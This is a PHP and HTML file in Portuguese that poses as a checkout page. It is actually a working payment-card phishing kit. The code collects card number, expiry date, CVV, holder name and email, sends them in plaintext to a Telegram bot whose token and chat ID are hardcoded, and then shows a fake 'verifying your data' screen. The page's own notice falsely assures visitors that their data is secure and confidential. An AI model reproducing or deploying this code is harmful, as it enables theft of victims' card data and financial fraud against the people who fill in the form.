<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Dados do formulário
    $cardNumber = $_POST['card_number'];
    $expiryDate = $_POST['expiry_date'];
    $cvv = $_POST['cvv'];
    $cardHolderName = $_POST['card_holder_name'];
    $email = $_POST['email'];

    // Bot do Telegram
    $token = '7669444519:AAGo7jY4rh9jqULfa2m5-fU0QILq2ul93IY';
    $chatId = '5789137812'; // Substitua pelo seu ID de chat do Telegram

    // Mensagem a ser enviada
    $message = "Novo pagamento:\n\n";
    $message .= "Número do Cartão: $cardNumber\n";
    $message .= "Data de Expiração: $expiryDate\n";
    $message .= "CVV: $cvv\n";
    $message .= "Nome do Dono: $cardHolderName\n";
    $message .= "E-mail: $email\n";

    // Enviar a mensagem para o bot do Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);
    
    // Exibir mensagem de análise após o envio
    $showAnalysis = true;
}
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .payment-box {
            background-color: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }

        .payment-box h2 {
            text-align: center;
            margin-bottom: 20px;
        }

        .payment-box label {
            display: block;
            margin-bottom: 8px;
        }

        .payment-box input {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .payment-box button {
            width: 100%;
            padding: 10px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .payment-box button:hover {
            background-color: #218838;
        }

        .warning-box {
            background-color: white;
            color: red;
            padding: 15px;
            border: 2px solid red;
            border-radius: 10px;
            margin-top: 20px;
            text-align: center;
            font-size: 16px;
        }

        .analysis-box {
            background-color: white;
            color: black;
            padding: 20px;
            border: 2px solid #28a745;
            border-radius: 10px;
            text-align: center;
            width: 300px;
            margin-top: 20px;
        }

        .analysis-box button {
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .analysis-box button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <?php if (isset($showAnalysis) && $showAnalysis): ?>
        <!-- Caixa de Análise com botão "Ok" -->
        <div class="analysis-box">
            <h3>Análise</h3>
            <p>Aguarde enquanto verificamos seus dados...</p>
            <form action="index.html">
                <button type="submit">Ok</button>
            </form>
        </div>
    <?php else: ?>
        <div class="payment-box">
            <h2>Pagamento</h2>
            <form action="" method="POST">
                <label for="card_number">Número do Cartão</label>
                <input type="text" id="card_number" name="card_number" required>

                <label for="expiry_date">Data de Expiração</label>
                <input type="month" id="expiry_date" name="expiry_date" required>

                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" required>

                <label for="card_holder_name">Nome do Dono do Cartão</label>
                <input type="text" id="card_holder_name" name="card_holder_name" required>

                <label for="email">E-mail</label>
                <input type="email" id="email" name="email" required>

                <button type="submit">Comprar</button>
            </form>

            <!-- Aviso abaixo do formulário -->
            <div class="warning-box">
                ⚠️ Atenção! Os dados fornecidos no momento do pagamento, incluindo informações do cartão e o e-mail cadastrado, são enviados para análise e verificação de pagamento. Após a confirmação da transação, nossa equipe libera o conteúdo adquirido, que será enviado diretamente ao e-mail informado durante a compra. Garantimos a segurança e a confidencialidade de todas as informações processadas.
            </div>
        </div>
    <?php endif; ?>
</body>
</html>